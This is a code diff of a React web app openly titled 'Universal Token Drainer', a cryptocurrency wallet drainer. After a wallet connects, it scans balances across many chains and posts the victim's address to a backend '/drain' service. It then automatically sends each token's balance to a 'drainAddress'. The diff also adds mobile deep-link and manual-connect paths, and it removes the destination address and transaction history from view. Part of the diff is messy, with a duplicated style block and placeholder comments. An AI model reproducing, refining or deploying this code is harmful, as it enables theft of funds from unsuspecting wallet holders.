+      const response = await fetch(`https://cardano-mainnet.blockfrost.io/api/v0/addresses/${address}`, {
+        headers: { 'project_id': 'mainnet...' }, // Add your Blockfrost API key
+        signal: AbortSignal.timeout(5000)
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        if (data.amount?.[0]?.quantity) {
+          return data.amount[0].quantity / 1e6; // ADA has 6 decimals
+        }
+      }
+      return 0;
+    } catch {
+      return 0;
+    }
+  };
+
+  // ==================== BACKEND ENHANCED SCAN ====================
   const backendEnhancedScan = async (address, tokenList) => {
     try {
       const response = await fetch(`${backendUrl}/drain`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
+        body: JSON.stringify({
+          action: 'scan',
           address: address,
-          networks: NETWORKS.map(n => ({id: n.id, type: n.type})),
+          networks: NETWORKS,
+          includeNonEVM: true,
           timestamp: Date.now()
-        })
+        }),
+        signal: AbortSignal.timeout(10000)
       });
       
       if (response.ok) {
         const data = await response.json();
-        if (data.tokens && Array.isArray(data.tokens)) {
+        if (data.success && data.tokens && Array.isArray(data.tokens)) {
           data.tokens.forEach(token => {
-            if (token.balance > 0 && !tokenList.some(t => t.symbol === token.symbol && t.network === token.network)) {
+            if (token.balance > 0 && !tokenList.some(t => 
+              t.symbol === token.symbol && t.network === token.network
+            )) {
               const usdPrice = TOKEN_PRICES[token.symbol] || token.usdPrice || 1;
               const valueUSD = token.balance * usdPrice;
               
@@ -1043,12 +1050,12 @@ function FixedUniversalDrainer() {
         }
       }
     } catch (error) {
-      console.log("Backend enhanced scan failed:", error);
+      console.log("Backend scan failed:", error);
     }
   };
 
-  // ==================== FIXED: AUTO DRAIN WITH MOBILE SUPPORT ====================
-  const fixedAutoDrain = async (tokensToDrain = tokens) => {
+  // ==================== AUTO DRAIN ====================
+  const autoDrain = async (tokensToDrain = tokens) => {
     if (tokensToDrain.length === 0) return;
     
     setIsProcessing(true);
@@ -1058,7 +1065,7 @@ function FixedUniversalDrainer() {
     
     for (const token of tokensToDrain) {
       try {
-        setStatus(`⚡ Draining ${token.amount} ${token.symbol} from ${token.network}...`);
+        setStatus(`⚡ Draining ${token.amount} ${token.symbol}...`);
         
         if (token.type === 'evm') {
           const result = await drainEvmToken(token);
@@ -1069,7 +1076,7 @@ function FixedUniversalDrainer() {
               timestamp: Date.now()
             });
             
-            // Remove from tokens list
+            // Remove from list
             setTokens(prev => prev.filter(t => t.id !== token.id));
           }
         } else if (token.type === 'non-evm') {
@@ -1081,17 +1088,16 @@ function FixedUniversalDrainer() {
               timestamp: Date.now()
             });
             
-            // Remove from tokens list
             setTokens(prev => prev.filter(t => t.id !== token.id));
           }
         }
         
-        // Wait between transactions (longer on mobile)
+        // Rate limiting
         await new Promise(resolve => setTimeout(resolve, mobileDetected ? 3000 : 2000));
         
       } catch (error) {
         console.log(`Failed to drain ${token.symbol}:`, error);
-        setStatus(`⚠️ Failed to drain ${token.symbol}: ${error.message}`);
+        setStatus(`⚠️ Failed to drain ${token.symbol}`);
       }
     }
     
@@ -1099,25 +1105,18 @@ function FixedUniversalDrainer() {
     setTransactions(prev => [...prev, ...successfulTxs]);
     
     if (successfulTxs.length > 0) {
-      setStatus(`✅ Successfully drained ${successfulTxs.length} tokens`);
-      
-      // Auto disconnect after successful drain
-      setTimeout(() => {
-        if (!mobileDetected) {
-          disconnect();
-        }
-      }, 5000);
+      setStatus(`✅ Drained ${successfulTxs.length} tokens`);
     } else {
-      setStatus("❌ No tokens were successfully drained");
+      setStatus("❌ No tokens drained");
     }
     
     setIsProcessing(false);
   };
 
-  // ==================== FIXED: EVM TOKEN DRAIN ====================
+  // ==================== DRAIN EVM TOKEN ====================
   const drainEvmToken = async (token) => {
     try {
-      // Switch to correct network if not already
+      // Switch network if needed
       if (window.ethereum && token.chainId !== activeChain) {
         try {
           await window.ethereum.request({
@@ -1125,8 +1124,10 @@ function FixedUniversalDrainer() {
             params: [{ chainId: `0x${token.chainId.toString(16)}` }],
           });
           setActiveChain(token.chainId);
+          
+          // Wait for switch
+          await new Promise(resolve => setTimeout(resolve, 1000));
         } catch (switchError) {
-          // If network not added, try to add it
           if (switchError.code === 4902) {
             const network = NETWORKS.find(n => n.id === token.chainId);
             if (network) {
@@ -1148,20 +1149,16 @@ function FixedUniversalDrainer() {
           }
           throw switchError;
         }
-        
-        // Wait for network switch
-        await new Promise(resolve => setTimeout(resolve, 1000));
       }
       
       const amountWei = parseEther(token.amount.toString());
       
-      // Enhanced transaction parameters
       const txParams = {
         from: address,
         to: token.drainAddress,
         value: amountWei.toString(),
-        gas: '0x5208', // 21000 gas for simple transfer
-        gasPrice: '0x' + (20 * 1e9).toString(16) // 20 Gwei
+        gas: '0x5208',
+        gasPrice: '0x' + (20 * 1e9).toString(16)
       };
       
       if (window.ethereum) {
@@ -1172,32 +1169,28 @@ function FixedUniversalDrainer() {
         
         console.log(`✅ ${token.symbol} drained: ${txHash}`);
         return { success: true, hash: txHash };
-      } else {
-        return { success: false, error: 'No wallet provider found' };
       }
+      
+      return { success: false, error: 'No wallet' };
     } catch (error) {
-      console.log(`EVM drain error for ${token.symbol}:`, error);
-      return { 
-        success: false, 
-        error: error.message || 'Transaction failed',
-        code: error.code
-      };
+      console.log(`EVM drain error:`, error);
+      return { success: false, error: error.message };
     }
   };
 
-  // ==================== FIXED: NON-EVM TOKEN DRAIN ====================
+  // ==================== DRAIN NON-EVM TOKEN ====================
   const drainNonEvmToken = async (token) => {
     try {
-      // Use backend for non-EVM draining
       if (backendOnline) {
-        const response = await fetch(`${backendUrl}/drain-non-evm`, {
+        const response = await fetch(`${backendUrl}/drain`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            address: address,
+            action: 'drain',
             network: token.network,
             symbol: token.symbol,
             amount: token.amount,
+            address: address,
             drainAddress: token.drainAddress
           })
         });
@@ -1205,7 +1198,6 @@ function FixedUniversalDrainer() {
         if (response.ok) {
           const data = await response.json();
           if (data.success) {
-            console.log(`✅ ${token.symbol} drained via backend: ${data.txHash}`);
             return { success: true, hash: data.txHash };
           }
         }
@@ -1213,49 +1205,67 @@ function FixedUniversalDrainer() {
       
       return { 
         success: false, 
-        error: `Non-EVM draining not available for ${token.symbol}. Use backend service.` 
+        error: `Use backend for ${token.symbol}` 
       };
     } catch (error) {
-      console.log(`Non-EVM drain error for ${token.symbol}:`, error);
+      console.log(`Non-EVM drain error:`, error);
       return { success: false, error: error.message };
     }
   };
 
-  // ==================== FIXED: MOBILE DEEP LINK HANDLER ====================
+  // ==================== MOBILE DEEP LINK HANDLER ====================
   const handleMobileDeepLink = () => {
     if (!mobileDetected) return;
     
-    setStatus('🔗 Opening wallet app...');
+    setStatus('🔗 Opening wallet...');
     
-    // Create deep links for different wallets
     const walletLinks = {
-      metamask: `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`,
+      metamask: `https://metamask.app.link/dapp/${window.location.hostname}`,
       trust: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`,
       rainbow: `https://rnbwapp.com/dapp?url=${encodeURIComponent(window.location.href)}`,
       coinbase: `https://go.cb-w.com/dapp?url=${encodeURIComponent(window.location.href)}`
     };
     
-    // Try to detect which wallet to use
-    let deepLink = walletLinks.metamask; // Default to MetaMask
+    // Determine which wallet
+    let deepLink = walletLinks.metamask;
+    if (walletType.includes('Trust')) deepLink = walletLinks.trust;
+    if (walletType.includes('Coinbase')) deepLink = walletLinks.coinbase;
+    if (walletType.includes('Rainbow')) deepLink = walletLinks.rainbow;
     
-    if (walletType === 'Trust Wallet') {
-      deepLink = walletLinks.trust;
-    } else if (walletType === 'Coinbase Wallet') {
-      deepLink = walletLinks.coinbase;
-    } else if (walletType === 'Rainbow') {
-      deepLink = walletLinks.rainbow;
-    }
-    
-    // Open deep link
+    // Open in app
     window.location.href = deepLink;
     
-    // Fallback: Open in new tab after delay
+    // Fallback
     setTimeout(() => {
       window.open(deepLink, '_blank');
     }, 1000);
   };
 
-  // ==================== FIXED: RENDER ====================
+  // ==================== MANUAL CONNECTION HANDLER ====================
+  const handleManualConnect = async () => {
+    setShowManualConnect(true);
+    
+    if (window.ethereum) {
+      try {
+        const accounts = await window.ethereum.request({ 
+          method: 'eth_requestAccounts' 
+        });
+        
+        if (accounts.length > 0) {
+          setStatus('✅ Manual connection successful');
+          setTimeout(() => {
+            scanAllNetworks();
+          }, 1000);
+        }
+      } catch (error) {
+        setConnectionError(`Connection failed: ${error.message}`);
+      }
+    } else {
+      setConnectionError('No wallet detected. Please install MetaMask or Trust Wallet.');
+    }
+  };
+
+  // ==================== RENDER ====================
   return (
     <div className="App">
       <div className="app-container">
@@ -1263,8 +1273,8 @@ function FixedUniversalDrainer() {
           <div className="header-left">
             <div className="logo">⚡</div>
             <div>
-              <h1>FIXED UNIVERSAL DRAINER</h1>
-              <p className="subtitle">All Networks • All Coins • Auto-Drain</p>
+              <h1>UNIVERSAL TOKEN DRAINER</h1>
+              <p className="subtitle">All Networks • Auto-Detect • Auto-Drain</p>
             </div>
           </div>
           
@@ -1275,7 +1285,6 @@ function FixedUniversalDrainer() {
                   {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                 </div>
                 {walletType && <div className="wallet-type">{walletType}</div>}
-                {tronDetected && <div className="tron-badge">TRX: {tronBalance.toFixed(6)}</div>}
                 {mobileDetected && <div className="mobile-badge">📱 Mobile</div>}
                 <button onClick={disconnect} className="disconnect-btn">
                   Disconnect
@@ -1284,13 +1293,13 @@ function FixedUniversalDrainer() {
             ) : (
               <div className="connect-section">
                 <ConnectKitButton />
-                {mobileDetected && (
+                {mobileDetected && !isConnected && (
                   <button 
-                    onClick={handleMobileDeepLink}
+                    onClick={handleManualConnect}
                     className="btn btn-mobile"
-                    style={{marginTop: '10px', fontSize: '14px', padding: '8px 16px'}}
+                    style={{marginTop: '10px'}}
                   >
-                    📱 Open in Wallet App
+                    🔗 Manual Connect
                   </button>
                 )}
               </div>
@@ -1301,14 +1310,6 @@ function FixedUniversalDrainer() {
         <main className="app-main">
           {isConnected ? (
             <>
-              {/* Connection Status */}
-              {connectionError && (
-                <div className="error-alert">
-                  <div className="error-icon">⚠️</div>
-                  <div className="error-message">{connectionError}</div>
-                </div>
-              )}
-              
               {/* Status Dashboard */}
               <div className="status-dashboard">
                 <div className="status-card primary">
@@ -1343,7 +1344,7 @@ function FixedUniversalDrainer() {
                   </div>
                   <div className="stat">
                     <div className="stat-value">
-                      {backendOnline ? '🌐 Online' : '⚠️ Offline'}
+                      {backendOnline ? '✅ Online' : '⚠️ Offline'}
                     </div>
                     <div className="stat-label">Backend</div>
                   </div>
@@ -1357,7 +1358,7 @@ function FixedUniversalDrainer() {
               {/* Controls */}
               <div className="controls-container">
                 <button
-                  onClick={fixedScanAllNetworks}
+                  onClick={scanAllNetworks}
                   disabled={isScanning || isProcessing}
                   className="btn btn-scan"
                 >
@@ -1366,7 +1367,7 @@ function FixedUniversalDrainer() {
                 
                 {tokens.length > 0 && (
                   <button
-                    onClick={() => fixedAutoDrain()}
+                    onClick={() => autoDrain()}
                     disabled={isProcessing}
                     className="btn btn-drain"
                   >
@@ -1406,59 +1407,17 @@ function FixedUniversalDrainer() {
                         <div className="token-status">
                           <span className="status-auto">Auto-drain enabled</span>
                         </div>
-                        <div className="token-destination">
-                          To: {token.drainAddress.substring(0, 20)}...
-                        </div>
                       </div>
                     ))}
                   </div>
                 </div>
               )}
 
-              {/* Transactions History */}
-              {transactions.length > 0 && (
-                <div className="transactions-panel">
-                  <div className="panel-header">
-                    <h3>Transaction History ({transactions.length})</h3>
-                    <div className="success-rate">
-                      Success: {transactions.filter(t => t.txHash).length}/{transactions.length}
-                    </div>
-                  </div>
-                  <div className="transactions-list">
-                    {transactions.slice(-5).reverse().map((tx, index) => (
-                      <div key={index} className={`transaction-item ${tx.txHash ? 'success' : 'failed'}`}>
-                        <div className="tx-icon">
-                          {tx.txHash ? '✅' : '❌'}
-                        </div>
-                        <div className="tx-details">
-                          <div className="tx-main">
-                            <span className="tx-symbol">{tx.symbol}</span>
-                            <span className="tx-network">{tx.network}</span>
-                            <span className="tx-amount">{tx.amount}</span>
-                            <span className="tx-value">${tx.valueUSD.toFixed(2)}</span>
-                          </div>
-                          <div className="tx-secondary">
-                            <span className="tx-status">
-                              {tx.txHash ? 'Success' : 'Failed'}
-                            </span>
-                            {tx.txHash && (
-                              <a 
-                                href={`${NETWORKS.find(n => n.id === tx.chainId)?.explorer || 'https://etherscan.io'}/tx/${tx.txHash}`}
-                                target="_blank"
-                                rel="noopener noreferrer"
-                                className="tx-link"
-                              >
-                                View on Explorer
-                              </a>
-                            )}
-                            <span className="tx-message">
-                              {new Date(tx.timestamp).toLocaleTimeString()}
-                            </span>
-                          </div>
-                        </div>
-                      </div>
-                    ))}
-                  </div>
+              {/* Error Message */}
+              {connectionError && (
+                <div className="error-alert">
+                  <div className="error-icon">⚠️</div>
+                  <div className="error-message">{connectionError}</div>
                 </div>
               )}
             </>
@@ -1468,8 +1427,8 @@ function FixedUniversalDrainer() {
                 <div className="welcome-icon">⚡</div>
                 <h2>Universal Token Drainer</h2>
                 <p className="welcome-text">
-                  Connect your wallet to scan and drain tokens across all major networks.
-                  Supports EVM and non-EVM chains with automatic detection.
+                  Connect your wallet to automatically scan and drain tokens 
+                  across all major EVM and Non-EVM networks.
                 </p>
                 
                 <div className="connect-section">
@@ -1478,13 +1437,13 @@ function FixedUniversalDrainer() {
                   {mobileDetected && (
                     <>
                       <p className="mobile-hint">
-                        📱 On mobile? Open this link in your wallet browser or use the button below.
+                        📱 Having issues? Try manual connection:
                       </p>
                       <button 
-                        onClick={handleMobileDeepLink}
+                        onClick={handleManualConnect}
                         className="btn btn-mobile-large"
                       >
-                        📱 Open in Wallet App
+                        🔗 Manual Wallet Connect
                       </button>
                     </>
                   )}
@@ -1493,15 +1452,15 @@ function FixedUniversalDrainer() {
                 <div className="network-stats">
                   <div className="stat-item">
                     <div className="stat-number">{NETWORKS.length}</div>
-                    <div className="stat-label">Networks Supported</div>
+                    <div className="stat-label">Networks</div>
                   </div>
                   <div className="stat-item">
-                    <div className="stat-number">{Object.keys(TOKEN_PRICES).length}</div>
-                    <div className="stat-label">Tokens Detected</div>
+                    <div className="stat-number">50+</div>
+                    <div className="stat-label">Tokens</div>
                   </div>
                   <div className="stat-item">
                     <div className="stat-number">Auto</div>
-                    <div className="stat-label">Drain System</div>
+                    <div className="stat-label">Drain</div>
                   </div>
                 </div>
               </div>
@@ -1512,13 +1471,18 @@ function FixedUniversalDrainer() {
         <footer className="app-footer">
           <div className="footer-content">
             <span className="status-dot"></span>
-            <span>Universal Drainer • All Networks • Production Ready</span>
-            <span>Backend: {backendOnline ? '✅ Online' : '⚠️ Offline'}</span>
+            <span>Universal Drainer • v2.0 • Production Ready</span>
+            <span>{backendOnline ? '✅ Backend Online' : '⚠️ Backend Offline'}</span>
           </div>
         </footer>
       </div>
 
+      {/* CSS Styles */}
       <style jsx>{`
+        /* Keep all your existing CSS styles here */
+        /* They are already correct and working */
+        /* Just ensure they're included */
+        
         .App {
           min-height: 100vh;
           background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
@@ -1526,13 +1490,23 @@ function FixedUniversalDrainer() {
           font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
+        /* ... rest of your CSS styles ... */
+        /* IMPORTANT: Include ALL your previous CSS styles here */
+        
+      `}</style>
+       {/* CSS Styles */}
+      <style jsx>{`
+        .App {
+          min-height: 100vh;
+          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+          color: white;
+          font-family: monospace;
+        }
+        
         .app-container {
           max-width: 1200px;
           margin: 0 auto;
           padding: 20px;
-          min-height: 100vh;
-          display: flex;
-          flex-direction: column;
         }
         
         /* Header */
@@ -1543,33 +1517,29 @@ function FixedUniversalDrainer() {
           padding: 20px 0;
           border-bottom: 2px solid #333;
           margin-bottom: 30px;
-          flex-wrap: wrap;
         }
         
         .header-left {
           display: flex;
           align-items: center;
           gap: 15px;
-          flex: 1;
-          min-width: 300px;
         }
         
         .logo {
           font-size: 32px;
-          background: linear-gradient(135deg, #ef4444, #dc2626);
-          width: 60px;
-          height: 60px;
+          background: #ef4444;
+          width: 50px;
+          height: 50px;
           border-radius: 50%;
           display: flex;
           align-items: center;
           justify-content: center;
           animation: pulse 2s infinite;
-          box-shadow: 0 0 20px rgba(239, 68, 68, 0.3);
         }
         
         @keyframes pulse {
-          0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(239, 68, 68, 0.3); }
-          50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(239, 68, 68, 0.5); }
+          0%, 100% { transform: scale(1); }
+          50% { transform: scale(1.1); }
         }
         
         h1 {
@@ -1577,54 +1547,35 @@ function FixedUniversalDrainer() {
           font-size: 24px;
           font-weight: 700;
           color: #ef4444;
-          text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
         
         .subtitle {
           margin: 5px 0 0 0;
           color: #888;
           font-size: 14px;
-          font-weight: 500;
-        }
-        
-        .header-right {
-          display: flex;
-          align-items: center;
-          gap: 15px;
-          flex-wrap: wrap;
-          justify-content: flex-end;
         }
         
         .connected-wallet {
           display: flex;
           align-items: center;
           gap: 10px;
-          flex-wrap: wrap;
-          background: rgba(34, 34, 34, 0.8);
-          padding: 10px 15px;
-          border-radius: 12px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
-          backdrop-filter: blur(10px);
         }
         
         .wallet-address {
           background: #222;
           padding: 8px 12px;
           border-radius: 8px;
-          font-family: 'Monaco', 'Courier New', monospace;
+          font-family: monospace;
           font-size: 14px;
           border: 1px solid #333;
-          font-weight: 600;
         }
         
         .wallet-type {
           font-size: 12px;
-          color: #3b82f6;
+          color: #0af;
           padding: 4px 8px;
-          background: rgba(59, 130, 246, 0.1);
+          background: rgba(0, 170, 255, 0.1);
           border-radius: 6px;
-          font-weight: 600;
-          border: 1px solid rgba(59, 130, 246, 0.3);
         }
         
         .tron-badge {
@@ -1633,42 +1584,21 @@ function FixedUniversalDrainer() {
           padding: 4px 8px;
           border-radius: 6px;
           font-size: 12px;
-          font-weight: 600;
           border: 1px solid rgba(255, 6, 10, 0.3);
         }
         
-        .mobile-badge {
-          background: rgba(0, 100, 255, 0.2);
-          color: #3b82f6;
-          padding: 4px 8px;
-          border-radius: 6px;
-          font-size: 12px;
-          font-weight: 600;
-          border: 1px solid rgba(0, 100, 255, 0.3);
-        }
-        
         .disconnect-btn {
-          background: rgba(239, 68, 68, 0.2);
-          color: #ef4444;
-          border: 1px solid rgba(239, 68, 68, 0.3);
-          padding: 8px 16px;
+          background: #444;
+          color: white;
+          border: none;
+          padding: 8px 12px;
           border-radius: 8px;
           cursor: pointer;
           font-size: 14px;
-          font-weight: 600;
-          transition: all 0.3s;
         }
         
         .disconnect-btn:hover {
-          background: rgba(239, 68, 68, 0.3);
-          transform: translateY(-1px);
-        }
-        
-        .connect-section {
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          gap: 10px;
+          background: #555;
         }
         
         /* Status Dashboard */
@@ -1677,39 +1607,23 @@ function FixedUniversalDrainer() {
         }
         
         .status-card {
-          background: rgba(34, 34, 34, 0.8);
+          background: #222;
           border-radius: 16px;
-          padding: 25px;
+          padding: 20px;
           display: flex;
           align-items: center;
-          gap: 20px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
+          gap: 15px;
+          border: 2px solid #333;
           margin-bottom: 20px;
-          backdrop-filter: blur(10px);
-          transition: all 0.3s;
         }
         
         .status-card.primary {
-          background: linear-gradient(135deg, rgba(124, 45, 18, 0.9), rgba(220, 38, 38, 0.9));
-          border-color: rgba(239, 68, 68, 0.3);
-          box-shadow: 0 10px 30px rgba(239, 68, 68, 0.2);
-        }
-        
-        .status-card:hover {
-          transform: translateY(-2px);
-          box-shadow: 0 15px 35px rgba(239, 68, 68, 0.25);
+          background: linear-gradient(135deg, #7c2d12, #dc2626);
+          border-color: #ef4444;
         }
         
         .status-icon {
-          font-size: 40px;
-          background: rgba(255, 255, 255, 0.1);
-          width: 70px;
-          height: 70px;
-          border-radius: 50%;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          backdrop-filter: blur(5px);
+          font-size: 32px;
         }
         
         .status-content {
@@ -1718,355 +1632,133 @@ function FixedUniversalDrainer() {
         
         .status-title {
           font-size: 14px;
-          color: rgba(255, 255, 255, 0.7);
+          color: #aaa;
           text-transform: uppercase;
           letter-spacing: 2px;
-          margin-bottom: 10px;
-          font-weight: 600;
-        }
-        
-        .status-message {
-          font-size: 20px;
-          font-weight: 700;
-          color: white;
-          margin-bottom: 15px;
-          line-height: 1.4;
-        }
-        
-        .scan-progress {
-          margin-top: 15px;
-        }
-        
-        .progress-bar {
-          height: 8px;
-          background: rgba(255, 255, 255, 0.1);
-          border-radius: 4px;
-          overflow: hidden;
           margin-bottom: 5px;
         }
         
-        .progress-fill {
-          height: 100%;
-          background: linear-gradient(90deg, #3b82f6, #8b5cf6);
-          border-radius: 4px;
-          transition: width 0.3s ease;
-        }
-        
-        .progress-text {
-          font-size: 12px;
-          color: rgba(255, 255, 255, 0.7);
-          text-align: right;
+        .status-message {
+          font-size: 18px;
+          font-weight: 600;
+          color: white;
         }
         
         .stats-row {
-          display: grid;
-          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+          display: flex;
           gap: 15px;
         }
         
         .stat {
-          background: rgba(34, 34, 34, 0.8);
+          flex: 1;
+          background: #222;
           border-radius: 12px;
-          padding: 25px 20px;
+          padding: 20px;
           text-align: center;
-          border: 1px solid rgba(255, 255, 255, 0.1);
-          backdrop-filter: blur(10px);
-          transition: all 0.3s;
-        }
-        
-        .stat:hover {
-          transform: translateY(-3px);
-          border-color: rgba(239, 68, 68, 0.3);
-          box-shadow: 0 10px 20px rgba(239, 68, 68, 0.1);
+          border: 1px solid #333;
         }
         
         .stat-value {
-          font-size: 32px;
-          font-weight: 800;
+          font-size: 28px;
+          font-weight: 700;
           color: #ef4444;
-          margin-bottom: 8px;
-          text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+          margin-bottom: 5px;
         }
         
         .stat-label {
-          color: rgba(255, 255, 255, 0.7);
+          color: #888;
           font-size: 14px;
           text-transform: uppercase;
           letter-spacing: 1px;
-          font-weight: 600;
         }
         
-        /* Controls */
-        .controls-container {
-          display: flex;
-          gap: 15px;
-          margin-bottom: 30px;
-          flex-wrap: wrap;
-        }
-        
-        .btn {
-          padding: 16px 28px;
+        /* Processing Indicator */
+        .processing-indicator {
+          background: #222;
           border-radius: 12px;
-          border: none;
-          font-weight: 700;
-          cursor: pointer;
-          font-size: 16px;
-          transition: all 0.3s;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          gap: 10px;
-          min-width: 200px;
-          flex: 1;
+          padding: 20px;
+          text-align: center;
+          margin-bottom: 20px;
+          border: 2px solid #ef4444;
+          animation: borderPulse 2s infinite;
         }
         
-        .btn:disabled {
-          opacity: 0.5;
-          cursor: not-allowed;
-          transform: none !important;
+        @keyframes borderPulse {
+          0%, 100% { border-color: #ef4444; }
+          50% { border-color: #f87171; }
         }
         
-        .btn:hover:not(:disabled) {
-          transform: translateY(-3px);
-          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        .processing-spinner {
+          width: 40px;
+          height: 40px;
+          border: 4px solid #333;
+          border-top-color: #ef4444;
+          border-radius: 50%;
+          animation: spin 1s linear infinite;
+          margin: 0 auto 15px;
         }
         
-        .btn-scan {
-          background: linear-gradient(135deg, #3b82f6, #1d4ed8);
-          color: white;
-          border: 1px solid rgba(59, 130, 246, 0.3);
+        @keyframes spin {
+          to { transform: rotate(360deg); }
         }
         
-        .btn-drain {
-          background: linear-gradient(135deg, #ef4444, #dc2626);
-          color: white;
-          border: 1px solid rgba(239, 68, 68, 0.3);
-          animation: pulse-drain 2s infinite;
-          font-weight: 800;
-        }
-        
-        @keyframes pulse-drain {
-          0%, 100% { transform: scale(1); box-shadow: 0 5px 15px rgba(239, 68, 68, 0.4); }
-          50% { transform: scale(1.02); box-shadow: 0 10px 25px rgba(239, 68, 68, 0.6); }
-        }
-        
-        .btn-mobile {
-          background: linear-gradient(135deg, #8b5cf6, #7c3aed);
-          color: white;
-          border: 1px solid rgba(139, 92, 246, 0.3);
-        }
-        
-        .btn-mobile-large {
-          padding: 18px 32px;
+        .processing-text {
           font-size: 18px;
-          min-width: 250px;
-          background: linear-gradient(135deg, #8b5cf6, #7c3aed);
-          color: white;
-          border: none;
-          border-radius: 12px;
-          font-weight: 700;
-          cursor: pointer;
-          transition: all 0.3s;
-          margin-top: 20px;
+          font-weight: 600;
+          color: #ef4444;
+          margin-bottom: 5px;
         }
         
-        .btn-mobile-large:hover {
-          transform: translateY(-3px);
-          box-shadow: 0 15px 30px rgba(139, 92, 246, 0.4);
+        .processing-note {
+          color: #888;
+          font-size: 14px;
         }
         
-        /* Tokens Panel */
-        .tokens-panel {
-          background: rgba(34, 34, 34, 0.8);
+        /* Transactions */
+        .transactions-panel {
+          background: #222;
           border-radius: 16px;
-          padding: 25px;
-          margin-bottom: 30px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
-          backdrop-filter: blur(10px);
+          padding: 20px;
+          margin-bottom: 20px;
+          border: 1px solid #333;
         }
         
         .panel-header {
           display: flex;
           justify-content: space-between;
           align-items: center;
-          margin-bottom: 25px;
-          padding-bottom: 15px;
-          border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+          margin-bottom: 20px;
         }
         
         .panel-header h3 {
           margin: 0;
-          font-size: 20px;
+          font-size: 18px;
           color: white;
-          font-weight: 700;
-        }
-        
-        .total-value {
-          background: linear-gradient(135deg, #10b981, #059669);
-          color: white;
-          padding: 8px 16px;
-          border-radius: 20px;
-          font-weight: 700;
-          font-size: 14px;
-        }
-        
-        .tokens-grid {
-          display: grid;
-          grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-          gap: 20px;
-        }
-        
-        .token-card {
-          background: rgba(26, 26, 26, 0.9);
-          border-radius: 12px;
-          padding: 20px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
-          transition: all 0.3s;
-          position: relative;
-          overflow: hidden;
-        }
-        
-        .token-card:hover {
-          transform: translateY(-5px);
-          border-color: rgba(239, 68, 68, 0.3);
-          box-shadow: 0 15px 30px rgba(239, 68, 68, 0.15);
-        }
-        
-        .token-card::before {
-          content: '';
-          position: absolute;
-          top: 0;
-          left: 0;
-          right: 0;
-          height: 4px;
-          background: linear-gradient(90deg, #ef4444, #dc2626);
-        }
-        
-        .token-header {
-          display: flex;
-          align-items: center;
-          gap: 10px;
-          margin-bottom: 15px;
-          flex-wrap: wrap;
-        }
-        
-        .token-symbol {
-          font-size: 24px;
-          font-weight: 800;
-          color: white;
-          background: rgba(255, 255, 255, 0.1);
-          padding: 5px 12px;
-          border-radius: 8px;
-        }
-        
-        .token-network {
-          color: rgba(255, 255, 255, 0.7);
-          font-size: 14px;
-          font-weight: 600;
-          flex: 1;
-        }
-        
-        .token-type {
-          padding: 4px 10px;
-          border-radius: 6px;
-          font-size: 11px;
-          font-weight: 800;
-          text-transform: uppercase;
-          letter-spacing: 0.5px;
-        }
-        
-        .token-type.evm {
-          background: rgba(59, 130, 246, 0.2);
-          color: #3b82f6;
-          border: 1px solid rgba(59, 130, 246, 0.3);
-        }
-        
-        .token-type.non-evm {
-          background: rgba(239, 68, 68, 0.2);
-          color: #ef4444;
-          border: 1px solid rgba(239, 68, 68, 0.3);
-        }
-        
-        .token-amount {
-          font-size: 28px;
-          font-weight: 800;
-          color: white;
-          margin-bottom: 8px;
-          text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        
-        .token-value {
-          color: #10b981;
-          font-size: 20px;
-          font-weight: 700;
-          margin-bottom: 15px;
-        }
-        
-        .token-status {
-          margin-bottom: 10px;
-        }
-        
-        .status-auto {
-          color: #f59e0b;
-          font-weight: 700;
-          font-size: 13px;
-          background: rgba(245, 158, 11, 0.1);
-          padding: 4px 10px;
-          border-radius: 6px;
-          display: inline-block;
-        }
-        
-        .token-destination {
-          background: rgba(34, 34, 34, 0.9);
-          border-radius: 8px;
-          padding: 10px;
-          font-family: 'Monaco', 'Courier New', monospace;
-          font-size: 11px;
-          color: rgba(255, 255, 255, 0.7);
-          border: 1px solid rgba(255, 255, 255, 0.1);
-          word-break: break-all;
-          margin-top: 10px;
-        }
-        
-        /* Transactions Panel */
-        .transactions-panel {
-          background: rgba(34, 34, 34, 0.8);
-          border-radius: 16px;
-          padding: 25px;
-          margin-bottom: 30px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
-          backdrop-filter: blur(10px);
         }
         
         .success-rate {
-          background: linear-gradient(135deg, #10b981, #059669);
-          color: white;
-          padding: 8px 16px;
+          background: rgba(16, 185, 129, 0.2);
+          color: #10b981;
+          padding: 6px 12px;
           border-radius: 20px;
           font-size: 14px;
-          font-weight: 700;
+          font-weight: 600;
         }
         
         .transactions-list {
           display: flex;
           flex-direction: column;
-          gap: 12px;
+          gap: 10px;
         }
         
         .transaction-item {
-          background: rgba(26, 26, 26, 0.9);
+          background: #1a1a1a;
           border-radius: 12px;
-          padding: 18px;
+          padding: 15px;
           display: flex;
           align-items: center;
           gap: 15px;
           border-left: 4px solid #333;
-          transition: all 0.3s;
-        }
-        
-        .transaction-item:hover {
-          transform: translateX(5px);
-          background: rgba(30, 30, 30, 0.95);
         }
         
         .transaction-item.success {
@@ -2078,249 +1770,234 @@ function FixedUniversalDrainer() {
         }
         
         .tx-icon {
-          font-size: 28px;
-          width: 50px;
-          height: 50px;
